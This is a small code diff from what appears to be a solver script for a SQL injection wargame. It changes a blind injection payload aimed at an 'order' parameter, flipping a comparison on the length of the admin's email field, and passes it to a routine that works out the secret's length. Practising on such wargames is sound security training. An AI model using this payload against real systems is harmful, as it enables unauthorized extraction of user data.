@@ -36,7 +36,7 @@ def main():
     method = 'get'
     inj_param = 'order'
 
-    payload = "id='admin' and length(email)>%s desc"
+    payload = "id='admin' and length(email)<%s desc"
     p = los.SqlInjection(url, cook, method, inj_param, payload)
     len_of_key = p.find_key_len(check_func)
 
